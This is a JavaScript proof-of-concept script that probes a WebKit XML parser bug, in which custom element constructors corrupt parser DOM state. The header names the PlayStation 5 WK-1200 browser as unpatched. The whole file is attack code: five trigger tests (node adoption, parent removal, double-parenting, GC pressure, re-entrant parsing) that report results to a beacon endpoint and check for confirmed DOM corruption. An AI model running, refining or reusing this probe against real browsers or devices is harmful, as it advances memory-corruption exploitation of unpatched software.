// p406 - XMLDocumentParser custom element DOM confusion
//
// Bug: XMLDocumentParserLibxml2.cpp startElementNs (~line 844)
// After custom element constructor runs, parser does parserAppendChild
// without validating m_currentNode or newElement state.
// Constructor can: re-parent element, detach m_currentNode, adopt into
// another document.
//
// Fixed in WK-1400: validates m_currentNode, parentNode, and document match.
// PS5 WK-1200: UNPATCHED.
//
// Beacon prefix: V406-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V406-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {}
  }

  B('BOOT');

  // Check Custom Elements API
  if (typeof customElements === 'undefined') {
    B('NO-CUSTOM-ELEMENTS');
    B('COMPLETE');
    return;
  }
  B('CE-OK');

  var testIdx = 0;
  var tests = [];

  function runNext() {
    if (testIdx < tests.length) {
      var t = tests[testIdx++];
      try {
        t();
      } catch(e) {
        B('T' + testIdx + '-THROW-' + e.message.substring(0, 50));
        setTimeout(runNext, 100);
      }
    } else {
      B('COMPLETE');
    }
  }

  // T1: Custom element constructor re-parents itself via adoptNode
  tests.push(function() {
    B('T1-START');

    var doc2 = document.implementation.createHTMLDocument('target');
    var adopted = null;

    class AdoptElement extends HTMLElement {
      constructor() {
        super();
        try {
          // Adopt this element into a different document
          adopted = doc2.adoptNode(this);
          B('T1-ADOPTED-' + (adopted === this));
        } catch(e) {
          B('T1-ADOPT-ERR-' + e.message.substring(0, 40));
        }
      }
    }

    try {
      customElements.define('adopt-elem', AdoptElement);
    } catch(e) {
      B('T1-DEFINE-ERR-' + e.message.substring(0, 40));
      setTimeout(runNext, 100);
      return;
    }

    // Parse XHTML containing the custom element
    try {
      var parser = new DOMParser();
      var xhtml = '<?xml version="1.0"?>' +
        '<html xmlns="http://www.w3.org/1999/xhtml">' +
        '<body><div id="parent"><adopt-elem id="test1"></adopt-elem></div></body></html>';

      var doc = parser.parseFromString(xhtml, 'application/xhtml+xml');

      var parent = doc.getElementById('parent');
      var elem = doc.getElementById('test1');
      var elem2 = doc2.getElementById('test1');

      B('T1-PARSE-OK');
      B('T1-PARENT-' + (parent ? 'Y' : 'N') + '-CHILDREN-' + (parent ? parent.childNodes.length : 'X'));
      B('T1-ELEM-DOC1-' + (elem ? 'FOUND' : 'GONE'));
      B('T1-ELEM-DOC2-' + (elem2 ? 'FOUND' : 'GONE'));

      if (adopted) {
        B('T1-ADOPTED-DOC-' + (adopted.ownerDocument === doc2 ? 'DOC2' : 'OTHER'));
        B('T1-ADOPTED-PARENT-' + (adopted.parentNode ? adopted.parentNode.nodeName : 'NULL'));
      }
    } catch(e) {
      B('T1-PARSE-ERR-' + e.message.substring(0, 50));
    }
    setTimeout(runNext, 100);
  });

  // T2: Constructor removes m_currentNode from document
  tests.push(function() {
    B('T2-START');

    var removedParent = false;

    class RemoverElement extends HTMLElement {
      constructor() {
        super();
        try {
          // We can't directly access m_currentNode, but we can try to
          // remove our expected parent from the DOM via stored reference
          if (window.__t2_parentRef) {
            window.__t2_parentRef.remove();
            removedParent = true;
            B('T2-PARENT-REMOVED');
          }
        } catch(e) {
          B('T2-REMOVE-ERR-' + e.message.substring(0, 40));
        }
      }
    }

    try {
      customElements.define('remover-elem', RemoverElement);
    } catch(e) {
      B('T2-DEFINE-ERR');
      setTimeout(runNext, 100);
      return;
    }

    // We can't easily pass a reference to the parent during XML parsing
    // because the custom element constructor runs before appending.
    // Instead, try innerHTML on an existing element with XHTML namespace.
    try {
      var container = document.createElement('div');
      document.body.appendChild(container);
      window.__t2_parentRef = container;

      // Use innerHTML -- may or may not go through XML parser
      container.innerHTML = '<remover-elem></remover-elem>';

      B('T2-INNERHTML-DONE');
      B('T2-CONTAINER-PARENT-' + (container.parentNode ? container.parentNode.nodeName : 'NULL'));
      B('T2-CONTAINER-CHILDREN-' + container.childNodes.length);
    } catch(e) {
      B('T2-ERR-' + e.message.substring(0, 50));
    }
    setTimeout(runNext, 100);
  });

  // T3: Constructor appends element to another parent (double-parent)
  tests.push(function() {
    B('T3-START');

    var altParent = document.createElement('div');
    altParent.id = 'alt-parent';
    document.body.appendChild(altParent);

    class DoubleParentElement extends HTMLElement {
      constructor() {
        super();
        try {
          // Append self to altParent during construction
          altParent.appendChild(this);
          B('T3-SELF-APPENDED');
        } catch(e) {
          B('T3-APPEND-ERR-' + e.message.substring(0, 40));
        }
      }
    }

    try {
      customElements.define('double-parent', DoubleParentElement);
    } catch(e) {
      B('T3-DEFINE-ERR');
      setTimeout(runNext, 100);
      return;
    }

    try {
      var parser = new DOMParser();
      var xhtml = '<?xml version="1.0"?>' +
        '<html xmlns="http://www.w3.org/1999/xhtml">' +
        '<body><div id="xmlparent"><double-parent id="dp1"></double-parent></div></body></html>';

      var doc = parser.parseFromString(xhtml, 'application/xhtml+xml');

      var xmlParent = doc.getElementById('xmlparent');
      var dp = doc.getElementById('dp1');
      var dpInAlt = altParent.querySelector('double-parent');

      B('T3-PARSE-OK');
      B('T3-XMLPARENT-CHILDREN-' + (xmlParent ? xmlParent.childNodes.length : 'X'));
      B('T3-DP-IN-XMLDOC-' + (dp ? 'Y' : 'N'));
      B('T3-DP-IN-ALTPARENT-' + (dpInAlt ? 'Y' : 'N'));

      // Check if element ended up in two parents (DOM corruption)
      if (dp && dpInAlt) {
        B('T3-DOUBLE-PARENT-CONFIRMED');
      }
    } catch(e) {
      B('T3-PARSE-ERR-' + e.message.substring(0, 50));
    }
    altParent.remove();
    setTimeout(runNext, 100);
  });

  // T4: Constructor triggers GC + allocations to reclaim memory
  tests.push(function() {
    B('T4-START');

    var gcTriggered = false;

    class GCElement extends HTMLElement {
      constructor() {
        super();
        try {
          // Create lots of garbage to trigger GC
          for (var i = 0; i < 10000; i++) {
            var obj = { a: new Array(100), b: String.fromCharCode(i % 65536) };
          }
          gcTriggered = true;
          B('T4-GC-TRIGGERED');
        } catch(e) {
          B('T4-GC-ERR-' + e.message.substring(0, 40));
        }
      }
    }

    try {
      customElements.define('gc-elem', GCElement);
    } catch(e) {
      B('T4-DEFINE-ERR');
      setTimeout(runNext, 100);
      return;
    }

    try {
      var parser = new DOMParser();
      var xhtml = '<?xml version="1.0"?>' +
        '<html xmlns="http://www.w3.org/1999/xhtml">' +
        '<body>';
      // Many custom elements to stress the path
      for (var i = 0; i < 50; i++) {
        xhtml += '<gc-elem id="gc' + i + '"></gc-elem>';
      }
      xhtml += '</body></html>';

      var doc = parser.parseFromString(xhtml, 'application/xhtml+xml');
      B('T4-PARSE-OK-CHILDREN-' + doc.body.childNodes.length);
    } catch(e) {
      B('T4-PARSE-ERR-' + e.message.substring(0, 50));
    }
    setTimeout(runNext, 100);
  });

  // T5: Constructor creates and parses nested XHTML (re-entrant parsing)
  tests.push(function() {
    B('T5-START');

    var nestDepth = 0;

    class NestElement extends HTMLElement {
      constructor() {
        super();
        nestDepth++;
        if (nestDepth <= 3) {
          try {
            var p = new DOMParser();
            var inner = '<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml">' +
              '<body><div>nested-' + nestDepth + '</div></body></html>';
            var innerDoc = p.parseFromString(inner, 'application/xhtml+xml');
            B('T5-NEST-' + nestDepth + '-OK');
          } catch(e) {
            B('T5-NEST-' + nestDepth + '-ERR-' + e.message.substring(0, 40));
          }
        }
      }
    }

    try {
      customElements.define('nest-elem', NestElement);
    } catch(e) {
      B('T5-DEFINE-ERR');
      setTimeout(runNext, 100);
      return;
    }

    try {
      var parser = new DOMParser();
      var xhtml = '<?xml version="1.0"?>' +
        '<html xmlns="http://www.w3.org/1999/xhtml">' +
        '<body><nest-elem></nest-elem></body></html>';
      var doc = parser.parseFromString(xhtml, 'application/xhtml+xml');
      B('T5-PARSE-OK');
    } catch(e) {
      B('T5-PARSE-ERR-' + e.message.substring(0, 50));
    }
    setTimeout(runNext, 100);
  });

  runNext();
})();
